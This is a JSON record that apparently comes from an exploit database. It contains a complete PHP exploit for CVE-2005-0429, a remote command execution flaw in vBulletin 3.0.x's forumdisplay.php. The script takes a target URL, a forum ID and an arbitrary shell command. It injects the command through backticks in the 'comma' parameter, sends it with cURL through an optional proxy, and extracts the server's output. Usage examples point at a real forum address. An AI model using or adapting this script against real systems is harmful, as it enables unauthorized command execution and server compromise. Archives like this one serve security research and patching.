{
  "id": "820",
  "title": "vBulletin 3.0.4 - &#039;forumdisplay.php&#039; Code Execution (2)",
  "cve": "CVE-2005-0429",
  "vuln_type": "unknown",
  "code": "<?php\r\n/**************************************************************\r\n#\r\n# vbulletin 3.0.x execute command by AL3NDALEEB al3ndaleeb[at]uk2.net\r\n#\r\n# First condition : $vboptions['showforumusers'] == True , the admin must set\r\n# showforumusers ON in vbulletin options.\r\n# Second condition: $bbuserinfo['userid'] == 0 , you must be an visitor/guest .\r\n# Third condition : $DB_site->fetch_array($forumusers) == True , when you\r\n# visit the forums, it must has at least\r\n# one user show the forum.\r\n# Fourth condition: magic_quotes_gpc must be OFF\r\n#\r\n# Vulnerable Systems:\r\n# vBulletin version 3.0 up to and including version 3.0.4\r\n# \r\n# Immune systems:\r\n# vBulletin version 3.0.5\r\n# vBulletin version 3.0.6\r\n# \r\n**************************************************************/\r\n\r\nif (!(function_exists('curl_init'))) {\r\necho \"cURL extension required\\n\";\r\nexit;\r\n}\r\n\r\nif ($argv[3]){\r\n$url = $argv[1];\r\n$forumid = intval($argv[2]);\r\n$command = $argv[3];\r\n}\r\nelse {\r\necho \"vbulletin 3.0 > 3.0.4 execute command by AL3NDALEEB al3ndaleeb[at]uk2.net\\n\\n\";\r\necho \"Usage: \".$argv[0].\" <url> <forumid> <command> [proxy]\\n\\n\";\r\necho \"<url> url to vbulletin site (ex: http://www.vbulletin.com/forum/)\\n\";\r\necho \"<forumid> forum id\\n\";\r\necho \"<command> command to execute on server (ex: 'ls -la')\\n\";\r\necho \"[proxy] optional proxy url (ex: http://proxy.ksa.com.sa:8080)\\n\\n\";\r\necho \"ex :\\n\";\r\necho \"\\tphp vb30x.php http://www.vbulletin.com/forum/ 2 \\\"ls -al\\\"\";\r\n\r\nexit;\r\n}\r\n\r\nif ($argv[4])\r\n$proxy = $argv[4];\r\n\r\n\r\n\r\n$action = 'forumdisplay.php?GLOBALS[]=1&f='.$forumid.'&comma=\".`echo _START_`.`'.$command.'`.`echo _END_`.\"';\r\n\r\n$ch=curl_init();\r\nif ($proxy){\r\ncurl_setopt($ch, CURLOPT_PROXY,$proxy);\r\n}\r\ncurl_setopt($ch, CURLOPT_URL,$url.'/'.$action);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER,1);\r\n$res=curl_exec ($ch);\r\ncurl_close ($ch);\r\n$res = substr($res, strpos($res, '_START_')+7);\r\n$res = substr($res,0, strpos($res, '_END_'));\r\necho $res;\r\n\r\n\r\n?>\r\n\r\n// milw0rm.com [2005-02-15]",
  "url": "https://www.exploit-db.com/exploits/820"
}